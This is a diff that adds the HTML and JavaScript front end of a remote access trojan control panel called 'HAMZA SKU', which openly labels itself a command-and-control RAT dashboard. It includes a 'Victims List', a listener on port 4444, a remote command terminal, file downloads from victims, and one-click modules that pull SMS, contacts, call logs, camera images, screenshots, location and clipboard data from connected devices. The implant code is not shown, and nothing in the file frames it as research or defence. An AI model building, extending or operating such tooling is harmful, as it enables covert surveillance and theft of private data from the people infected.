@@ -1,0 +1,1161 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HAMZA SKU - Advanced C2 Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&family=Cairo:wght@300;400;700&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.min.js"></script>
+    <style>
+        :root {
+            --primary: #00ff88;
+            --secondary: #0088ff;
+            --danger: #ff0055;
+            --warning: #ffaa00;
+            --success: #00ff88;
+            --bg-dark: #0a0e1a;
+            --bg-card: #141824;
+            --bg-input: #1a1f2e;
+            --text-primary: #e0e6ed;
+            --text-secondary: #8b95a8;
+            --border: #252b3b;
+            --glow: rgba(0, 255, 136, 0.5);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-primary);
+            overflow-x: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                linear-gradient(90deg, rgba(0, 255, 136, 0.03) 1px, transparent 1px),
+                linear-gradient(rgba(0, 255, 136, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            animation: gridMove 20s linear infinite;
+            pointer-events: none;
+            z-index: 0;
+        }
+        
+        @keyframes gridMove {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(50px, 50px); }
+        }
+        
+        .glow-orb {
+            position: fixed;
+            width: 600px;
+            height: 600px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(0, 255, 136, 0.15) 0%, transparent 70%);
+            filter: blur(80px);
+            pointer-events: none;
+            z-index: 1;
+            animation: orbFloat 15s ease-in-out infinite;
+        }
+        
+        .glow-orb:nth-child(1) { top: -200px; right: -200px; }
+        .glow-orb:nth-child(2) { bottom: -200px; left: -200px; background: radial-gradient(circle, rgba(0, 136, 255, 0.15) 0%, transparent 70%); animation-delay: -7s; }
+        
+        @keyframes orbFloat {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-50px, 50px) scale(1.1); }
+        }
+        
+        .container {
+            max-width: 1900px;
+            margin: 0 auto;
+            padding: 15px;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, var(--bg-card) 0%, rgba(20, 24, 36, 0.8) 100%);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 25px 35px;
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 136, 0.1), transparent);
+            animation: scan 3s linear infinite;
+        }
+        
+        @keyframes scan {
+            0% { left: -100%; }
+            100% { left: 200%; }
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .header h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 38px;
+            font-weight: 900;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px var(--glow);
+            margin-bottom: 8px;
+            letter-spacing: 2px;
+        }
+        
+        .header p {
+            color: var(--text-secondary);
+            font-size: 14px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        
+        .logout-btn {
+            background: linear-gradient(135deg, var(--danger), #cc0044);
+            border: none;
+            border-radius: 10px;
+            padding: 10px 20px;
+            color: white;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 20px rgba(255, 0, 85, 0.4);
+            font-size: 13px;
+            letter-spacing: 1px;
+        }
+        
+        .logout-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 30px rgba(255, 0, 85, 0.6);
+        }
+        
+        .stats-bar {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 20px;
+            transition: all 0.3s ease;
+        }
+        
+        .stat-card:hover {
+            border-color: var(--primary);
+            box-shadow: 0 8px 30px rgba(0, 255, 136, 0.2);
+            transform: translateY(-2px);
+        }
+        
+        .stat-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .stat-value {
+            font-size: 32px;
+            font-weight: 700;
+            font-family: 'Orbitron', sans-serif;
+            color: var(--primary);
+        }
+        
+        .status-indicator {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--danger);
+            display: inline-block;
+            margin-left: 8px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        
+        .status-indicator.active {
+            background: var(--primary);
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; box-shadow: 0 0 10px currentColor; }
+            50% { opacity: 0.5; box-shadow: 0 0 20px currentColor; }
+        }
+        
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid var(--border);
+        }
+        
+        .card-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 16px;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .control-panel {
+            grid-column: 1 / -1;
+        }
+        
+        .controls-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            font-size: 11px;
+            text-transform: uppercase;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+            letter-spacing: 1px;
+            font-weight: 700;
+        }
+        
+        input[type="text"],
+        input[type="number"] {
+            width: 100%;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 10px 14px;
+            color: var(--text-primary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            transition: all 0.3s ease;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
+        }
+        
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            letter-spacing: 1px;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary), #00cc66);
+            color: var(--bg-dark);
+            box-shadow: 0 4px 15px rgba(0, 255, 136, 0.4);
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px rgba(0, 255, 136, 0.6);
+        }
+        
+        .btn-danger {
+            background: linear-gradient(135deg, var(--danger), #cc0044);
+            color: white;
+            box-shadow: 0 4px 15px rgba(255, 0, 85, 0.4);
+        }
+        
+        .btn-danger:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px rgba(255, 0, 85, 0.6);
+        }
+        
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        
+        .quick-modules {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 10px;
+        }
+        
+        .module-btn {
+            background: rgba(0, 255, 136, 0.1);
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            border-radius: 10px;
+            padding: 15px 10px;
+            color: var(--primary);
+            font-family: 'Cairo', sans-serif;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+        
+        .module-btn:hover {
+            background: rgba(0, 255, 136, 0.2);
+            border-color: var(--primary);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 20px rgba(0, 255, 136, 0.4);
+        }
+        
+        .module-btn .icon {
+            font-size: 24px;
+            display: block;
+            margin-bottom: 8px;
+        }
+        
+        .targets-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+        }
+        
+        .targets-table th {
+            background: rgba(0, 255, 136, 0.1);
+            padding: 12px 10px;
+            text-align: right;
+            color: var(--primary);
+            font-weight: 700;
+            text-transform: uppercase;
+            border-bottom: 2px solid var(--primary);
+        }
+        
+        .targets-table td {
+            padding: 12px 10px;
+            border-bottom: 1px solid var(--border);
+            color: var(--text-primary);
+        }
+        
+        .targets-table tr {
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+        
+        .targets-table tr:hover {
+            background: rgba(0, 255, 136, 0.05);
+        }
+        
+        .targets-table tr.selected {
+            background: rgba(0, 255, 136, 0.15);
+            border-right: 3px solid var(--primary);
+        }
+        
+        .status-badge {
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+        
+        .status-badge.online {
+            background: rgba(0, 255, 136, 0.2);
+            color: var(--primary);
+        }
+        
+        .status-badge.offline {
+            background: rgba(255, 0, 85, 0.2);
+            color: var(--danger);
+        }
+        
+        .terminal {
+            background: #000000;
+            border: 2px solid var(--primary);
+            border-radius: 10px;
+            padding: 15px;
+            font-family: 'JetBrains Mono', monospace;
+            min-height: 250px;
+            max-height: 350px;
+            overflow-y: auto;
+            box-shadow: 
+                0 0 25px rgba(0, 255, 136, 0.3),
+                inset 0 0 40px rgba(0, 255, 136, 0.05);
+            font-size: 12px;
+        }
+        
+        .terminal::before {
+            content: 'root@hamza-sku:~#';
+            position: sticky;
+            top: 0;
+            display: block;
+            color: var(--primary);
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        
+        .terminal-line {
+            margin-bottom: 6px;
+            color: #00ff88;
+            animation: terminalEntry 0.3s ease;
+        }
+        
+        @keyframes terminalEntry {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        
+        .terminal::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        .terminal::-webkit-scrollbar-track {
+            background: #000;
+        }
+        
+        .terminal::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 3px;
+        }
+        
+        .command-input-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .command-input {
+            flex: 1;
+            background: var(--bg-input);
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 12px 16px;
+            color: var(--text-primary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            transition: all 0.3s ease;
+        }
+        
+        .command-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
+        }
+        
+        .output-box {
+            background: #000000;
+            border: 2px solid var(--secondary);
+            border-radius: 10px;
+            padding: 15px;
+            font-family: 'JetBrains Mono', monospace;
+            min-height: 250px;
+            max-height: 350px;
+            overflow-y: auto;
+            box-shadow: 
+                0 0 25px rgba(0, 136, 255, 0.3),
+                inset 0 0 40px rgba(0, 136, 255, 0.05);
+            font-size: 12px;
+        }
+        
+        .output-entry {
+            margin-bottom: 15px;
+            padding: 12px;
+            background: rgba(0, 136, 255, 0.05);
+            border-left: 3px solid var(--secondary);
+            border-radius: 6px;
+            animation: slideIn 0.3s ease;
+        }
+        
+        .output-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(0, 136, 255, 0.2);
+        }
+        
+        .output-command {
+            color: var(--secondary);
+            font-weight: 700;
+        }
+        
+        .output-time {
+            color: var(--text-secondary);
+            font-size: 11px;
+        }
+        
+        .output-content {
+            color: var(--text-primary);
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        
+        .file-explorer {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .file-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px;
+            margin-bottom: 8px;
+            background: rgba(255, 170, 0, 0.05);
+            border: 1px solid rgba(255, 170, 0, 0.2);
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+        
+        .file-item:hover {
+            background: rgba(255, 170, 0, 0.1);
+            border-color: var(--warning);
+            transform: translateX(-3px);
+        }
+        
+        .file-icon {
+            font-size: 28px;
+        }
+        
+        .file-info {
+            flex: 1;
+        }
+        
+        .file-name {
+            color: var(--text-primary);
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+        
+        .file-meta {
+            color: var(--text-secondary);
+            font-size: 11px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        
+        .download-btn-small {
+            background: linear-gradient(135deg, var(--warning), #ff8800);
+            color: var(--bg-dark);
+            border: none;
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 10px;
+            cursor: pointer;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            transition: all 0.3s ease;
+        }
+        
+        .download-btn-small:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(255, 170, 0, 0.6);
+        }
+        
+        .alert-popup {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: var(--bg-card);
+            border: 2px solid var(--primary);
+            border-radius: 12px;
+            padding: 15px 20px;
+            box-shadow: 0 8px 30px rgba(0, 255, 136, 0.5);
+            z-index: 1000;
+            animation: slideInLeft 0.4s ease;
+            max-width: 350px;
+        }
+        
+        @keyframes slideInLeft {
+            from { transform: translateX(-400px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        .alert-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 8px;
+        }
+        
+        .alert-icon {
+            font-size: 24px;
+        }
+        
+        .alert-title {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            font-size: 14px;
+        }
+        
+        .alert-message {
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-right: 34px;
+        }
+        
+        .alert-time {
+            font-size: 10px;
+            color: var(--text-secondary);
+            font-family: 'JetBrains Mono', monospace;
+            margin-top: 5px;
+        }
+        
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        
+        @media (max-width: 1400px) {
+            .stats-bar {
+                grid-template-columns: repeat(3, 1fr);
+            }
+            
+            .main-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .quick-modules {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="glow-orb"></div>
+    <div class="glow-orb"></div>
+    
+    <div class="container">
+        <div class="header">
+            <div class="header-content">
+                <div>
+                    <h1>⚡ HAMZA SKU</h1>
+                    <p>Professional Command & Control Platform - Advanced RAT Dashboard</p>
+                </div>
+                <button onclick="logout()" class="logout-btn">
+                    🔒 LOGOUT
+                </button>
+            </div>
+        </div>
+        
+        <div class="stats-bar">
+            <div class="stat-card">
+                <div class="stat-title">🎯 Active Targets</div>
+                <div class="stat-value" id="activeTargets">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-title">📊 Commands</div>
+                <div class="stat-value" id="totalCommands">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-title">📥 Downloads</div>
+                <div class="stat-value" id="totalDownloads">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-title">⏱️ Uptime</div>
+                <div class="stat-value" id="uptime" style="font-size: 24px;">00:00:00</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-title">Status<span class="status-indicator" id="statusIndicator"></span></div>
+                <div class="stat-value" id="serverStatus" style="font-size: 20px;">OFFLINE</div>
+            </div>
+        </div>
+        
+        <div class="card control-panel">
+            <div class="card-header">
+                <div class="card-title">🎛️ Control Panel</div>
+            </div>
+            <div class="controls-grid">
+                <div class="input-group">
+                    <label>🌐 Host Address</label>
+                    <input type="text" id="hostInput" value="0.0.0.0" placeholder="0.0.0.0">
+                </div>
+                <div class="input-group">
+                    <label>🎯 Port Number</label>
+                    <input type="number" id="portInput" value="4444" min="1" max="65535">
+                </div>
+                <div class="input-group" style="display: flex; align-items: flex-end;">
+                    <button class="btn btn-primary" id="startBtn" onclick="startServer()" style="width: 100%;">
+                        🚀 START SERVER
+                    </button>
+                </div>
+                <div class="input-group" style="display: flex; align-items: flex-end;">
+                    <button class="btn btn-danger" id="stopBtn" onclick="stopServer()" disabled style="width: 100%;">
+                        🛑 STOP SERVER
+                    </button>
+                </div>
+            </div>
+            
+            <div class="card-header">
+                <div class="card-title">⚡ Quick Modules (One-Click)</div>
+            </div>
+            <div class="quick-modules">
+                <button class="module-btn" onclick="quickCommand('sysinfo')">
+                    <span class="icon">💻</span>
+                    System Info
+                </button>
+                <button class="module-btn" onclick="quickCommand('location')">
+                    <span class="icon">📍</span>
+                    Location
+                </button>
+                <button class="module-btn" onclick="quickCommand('screenshot')">
+                    <span class="icon">📸</span>
+                    Screenshot
+                </button>
+                <button class="module-btn" onclick="quickCommand('sms')">
+                    <span class="icon">💬</span>
+                    Get SMS
+                </button>
+                <button class="module-btn" onclick="quickCommand('contacts')">
+                    <span class="icon">📞</span>
+                    Contacts
+                </button>
+                <button class="module-btn" onclick="quickCommand('camera')">
+                    <span class="icon">📷</span>
+                    Camera
+                </button>
+                <button class="module-btn" onclick="quickCommand('clipboard')">
+                    <span class="icon">📋</span>
+                    Clipboard
+                </button>
+                <button class="module-btn" onclick="quickCommand('battery')">
+                    <span class="icon">🔋</span>
+                    Battery
+                </button>
+                <button class="module-btn" onclick="quickCommand('wifi')">
+                    <span class="icon">📶</span>
+                    WiFi Info
+                </button>
+                <button class="module-btn" onclick="quickCommand('calls')">
+                    <span class="icon">📞</span>
+                    Call Log
+                </button>
+            </div>
+        </div>
+        
+        <div class="main-grid">
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title">🎯 Victims List</div>
+                    <div style="display: flex; gap: 10px; align-items: center;">
+                        <button class="btn btn-primary" onclick="scanConnections()" style="padding: 6px 14px; font-size: 11px;">
+                            🔍 SCAN
+                        </button>
+                        <span id="victimsCount" style="color: var(--text-secondary); font-size: 12px;">0 Online</span>
+                    </div>
+                </div>
+                <div style="max-height: 400px; overflow-y: auto;">
+                    <table class="targets-table" id="targetsTable">
+                        <thead>
+                            <tr>
+                                <th>#</th>
+                                <th>🌍</th>
+                                <th>IP Address</th>
+                                <th>Device</th>
+                                <th>Last Seen</th>
+                                <th>Status</th>
+                            </tr>
+                        </thead>
+                        <tbody id="targetsBody">
+                            <tr>
+                                <td colspan="6" style="text-align: center; color: var(--text-secondary); padding: 30px;">
+                                    No victims connected yet
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">💻 Command Terminal</div>
+                    </div>
+                    <div class="terminal" id="terminal">
+                        <div class="terminal-line">⚡ HAMZA SKU C2 Terminal Ready</div>
+                        <div class="terminal-line">Awaiting connection...</div>
+                    </div>
+                    <div class="command-input-group">
+                        <input 
+                            type="text" 
+                            class="command-input" 
+                            id="commandInput" 
+                            placeholder="Enter command..."
+                            onkeypress="handleCommandKey(event)"
+                        >
+                        <button class="btn btn-primary" onclick="executeCommand()">
+                            ▶ EXEC
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">📤 Output</div>
+                    </div>
+                    <div class="output-box" id="outputBox">
+                        <div style="color: var(--text-secondary); text-align: center; padding: 20px;">
+                            Waiting for command execution...
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="main-grid">
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title">📁 File Explorer</div>
+                </div>
+                <div class="file-explorer" id="fileExplorer">
+                    <div style="color: var(--text-secondary); text-align: center; padding: 30px;">
+                        No files available. Connect to a target first.
+                    </div>
+                </div>
+            </div>
+            
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title">📥 Downloads</div>
+                </div>
+                <div id="downloadsContainer" style="max-height: 400px; overflow-y: auto;">
+                    <div style="color: var(--text-secondary); text-align: center; padding: 30px;">
+                        No downloads yet
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div id="alertsContainer"></div>
+    
+    <script src="/static/dashboard.js"></script>
+    <script>
+        const socket = io();
+        let updateInterval;
+        let currentTarget = null;
+        
+        // Socket events
+        socket.on('connect', () => {
+            console.log('Connected to HAMZA SKU');
+            showAlert('success', '✅ Connected', 'Dashboard connected successfully');
+        });
+        
+        socket.on('new_log', (log) => addTerminalLine(`[${log.level}] ${log.message}`));
+        socket.on('listener_output', (data) => addTerminalLine(data.output));
+        socket.on('command_output', (data) => addOutputEntry(data));
+        socket.on('new_target', (target) => {
+            addTargetToTable(target);
+            showAlert('success', '🎯 New Victim', `${target.ip} connected!`);
+        });
+        socket.on('new_alert', (alert) => showAlert(alert.type, alert.title, alert.message));
+        
+        // Control functions
+        function startServer() {
+            const host = document.getElementById('hostInput').value;
+            const port = document.getElementById('portInput').value;
+            
+            fetch('/api/start', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ host, port: parseInt(port) })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    showAlert('success', '✅ Server Started', data.message);
+                    updateStatus();
+                } else {
+                    showAlert('danger', '❌ Failed', data.message);
+                }
+            });
+        }
+        
+        function stopServer() {
+            fetch('/api/stop', { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    showAlert('warning', '⚠️ Stopped', data.message);
+                } else {
+                    showAlert('danger', '❌ Failed', data.message);
+                }
+                updateStatus();
+            });
+        }
+        
+        function quickCommand(type) {
+            fetch('/api/quick-command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    showAlert('success', '⚡ Quick Module', `${type} executed`);
+                }
+            });
+        }
+        
+        function executeCommand() {
+            const input = document.getElementById('commandInput');
+            const command = input.value.trim();
+            if (!command) return;
+            
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    addTerminalLine(`> ${command}`);
+                    input.value = '';
+                }
+            });
+        }
+        
+        function handleCommandKey(e) {
+            if (e.key === 'Enter') executeCommand();
+        }
+        
+        function selectTarget(targetId) {
+            fetch(`/api/target/${targetId}/select`, { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    currentTarget = data.target;
+                    document.querySelectorAll('.targets-table tr').forEach(tr => tr.classList.remove('selected'));
+                    document.querySelector(`tr[data-id="${targetId}"]`)?.classList.add('selected');
+                    loadTargetFiles(targetId);
+                }
+            });
+        }
+        
+        function loadTargetFiles(targetId) {
+            fetch(`/api/target/${targetId}/files`)
+            .then(r => r.json())
+            .then(data => {
+                const container = document.getElementById('fileExplorer');
+                if (data.files && data.files.length > 0) {
+                    container.innerHTML = '';
+                    data.files.forEach(file => {
+                        container.innerHTML += `
+                            <div class="file-item">
+                                <div class="file-icon">${getFileIcon(file.type)}</div>
+                                <div class="file-info">
+                                    <div class="file-name">${file.name}</div>
+                                    <div class="file-meta">${file.size} • ${file.date}</div>
+                                </div>
+                                <button class="download-btn-small" onclick="downloadFile(${file.id})">
+                                    📥 Download
+                                </button>
+                            </div>
+                        `;
+                    });
+                }
+            });
+        }
+        
+        function getFileIcon(type) {
+            const icons = {
+                'image': '🖼️', 'video': '🎥', 'audio': '🎵',
+                'document': '📄', 'archive': '📦', 'contacts': '📞',
+                'sms': '💬', 'default': '📁'
+            };
+            return icons[type] || icons['default'];
+        }
+        
+        function downloadFile(fileId) {
+            window.location.href = `/api/download/${fileId}`;
+            showAlert('info', '📥 Downloading', 'File download started');
+        }
+        
+        function addTargetToTable(target) {
+            const tbody = document.getElementById('targetsBody');
+            if (tbody.querySelector('td[colspan]')) {
+                tbody.innerHTML = '';
+            }
+            
+            const row = document.createElement('tr');
+            row.dataset.id = target.id;
+            row.onclick = () => selectTarget(target.id);
+            row.innerHTML = `
+                <td>${target.id}</td>
+                <td>${target.flag}</td>
+                <td>${target.ip}</td>
+                <td>${target.device}</td>
+                <td>${target.last_seen}</td>
+                <td><span class="status-badge ${target.status}">${target.status}</span></td>
+            `;
+            tbody.appendChild(row);
+        }
+        
+        function addTerminalLine(text) {
+            const terminal = document.getElementById('terminal');
+            const line = document.createElement('div');
+            line.className = 'terminal-line';
+            line.textContent = text;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+        
+        function addOutputEntry(output) {
+            const box = document.getElementById('outputBox');
+            if (box.querySelector('[style*="text-align"]')) {
+                box.innerHTML = '';
+            }
+            
+            const entry = document.createElement('div');
+            entry.className = 'output-entry';
+            entry.innerHTML = `
+                <div class="output-header">
+                    <span class="output-command">$ ${output.command}</span>
+                    <span class="output-time">${output.timestamp}</span>
+                </div>
+                <div class="output-content">${output.output || 'Executing...'}</div>
+            `;
+            box.insertBefore(entry, box.firstChild);
+        }
+        
+        function showAlert(type, title, message) {
+            const container = document.getElementById('alertsContainer');
+            const alert = document.createElement('div');
+            alert.className = 'alert-popup';
+            alert.innerHTML = `
+                <div class="alert-header">
+                    <span class="alert-icon">${type === 'success' ? '✅' : type === 'danger' ? '❌' : '⚠️'}</span>
+                    <span class="alert-title">${title}</span>
+                </div>
+                <div class="alert-message">${message}</div>
+                <div class="alert-time">${new Date().toLocaleTimeString()}</div>
+            `;
+            container.appendChild(alert);
+            
+            setTimeout(() => {
+                alert.style.animation = 'slideInLeft 0.4s ease reverse';
+                setTimeout(() => alert.remove(), 400);
+            }, 4000);
+        }
+        
+        function updateStatus() {
+            fetch('/api/status')
+            .then(r => r.json())
+            .then(data => {
+                document.getElementById('serverStatus').textContent = data.is_running ? 'ONLINE' : 'OFFLINE';
+                document.getElementById('statusIndicator').className = 'status-indicator ' + (data.is_running ? 'active' : '');
+                document.getElementById('startBtn').disabled = data.is_running;
+                document.getElementById('stopBtn').disabled = !data.is_running;
+                document.getElementById('hostInput').disabled = data.is_running;
+                document.getElementById('portInput').disabled = data.is_running;
+                
+                if (data.uptime) {
+                    const h = Math.floor(data.uptime / 3600);
+                    const m = Math.floor((data.uptime % 3600) / 60);
+                    const s = Math.floor(data.uptime % 60);
+                    document.getElementById('uptime').textContent = 
+                        `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+                } else {
+                    document.getElementById('uptime').textContent = '00:00:00';
+                }
+                
+                document.getElementById('activeTargets').textContent = data.stats.active_targets || 0;
+                document.getElementById('totalCommands').textContent = data.stats.commands_executed;
+                document.getElementById('totalDownloads').textContent = data.stats.files_downloaded || 0;
+            });
+        }
+        
+        function updateTargets() {
+            fetch('/api/targets')
+            .then(r => r.json())
+            .then(data => {
+                if (data.targets && data.targets.length > 0) {
+                    document.getElementById('victimsCount').textContent = 
+                        `${data.targets.filter(t => t.status === 'online').length} Online`;
+                }
+            });
+        }
+        
+        function scanConnections() {
+            fetch('/api/connections/check', { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    if (data.new_targets > 0) {
+                        showAlert('success', '🔍 Scan Complete', `Found ${data.new_targets} new target(s)!`);
+                    } else {
+                        showAlert('info', '🔍 Scan Complete', `${data.connections} active connection(s), no new targets`);
+                    }
+                    updateTargets();
+                } else {
+                    showAlert('danger', '❌ Scan Failed', data.message);
+                }
+            });
+        }
+        
+        function logout() {
+            if (confirm('Are you sure you want to logout?')) {
+                window.location.href = '/logout';
+            }
+        }
+        
+        // Initialize
+        updateStatus();
+        updateTargets();
+        updateInterval = setInterval(() => {
+            updateStatus();
+            updateTargets();
+        }, 2000);
+    </script>
+</body>
+</html>
